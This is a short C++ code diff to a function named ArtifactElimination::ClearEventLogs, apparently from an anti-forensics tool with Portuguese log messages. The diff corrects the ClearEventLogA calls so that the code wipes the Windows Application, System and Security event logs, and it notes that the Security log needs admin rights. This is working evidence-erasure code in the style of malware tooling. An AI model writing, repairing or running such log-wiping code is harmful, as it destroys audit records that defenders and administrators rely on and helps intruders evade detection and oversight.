@@ -101,7 +101,7 @@ bool ArtifactElimination::ClearEventLogs() {
     // Open Application log
     HANDLE hEventLog = OpenEventLogA(NULL, "Application");
     if (hEventLog) {
-        if (ClearEventLogA(hEventLog)) {
+        if (ClearEventLogA(hEventLog, NULL)) {
             Logger::Success("Application log limpo");
         }
         CloseEventLog(hEventLog);
@@ -110,7 +110,7 @@ bool ArtifactElimination::ClearEventLogs() {
     // Open System log
     hEventLog = OpenEventLogA(NULL, "System");
     if (hEventLog) {
-        if (ClearEventLogA(hEventLog)) {
+        if (ClearEventLogA(hEventLog, NULL)) {
             Logger::Success("System log limpo");
         }
         CloseEventLog(hEventLog);
@@ -119,7 +119,7 @@ bool ArtifactElimination::ClearEventLogs() {
     // Open Security log (requires admin)
     hEventLog = OpenEventLogA(NULL, "Security");
     if (hEventLog) {
-        if (ClearEventLogA(hEventLog)) {
+        if (ClearEventLogA(hEventLog, NULL)) {
             Logger::Success("Security log limpo");
         } else {
             Logger::Warning("Acesso negado ao Security log (requer admin)");
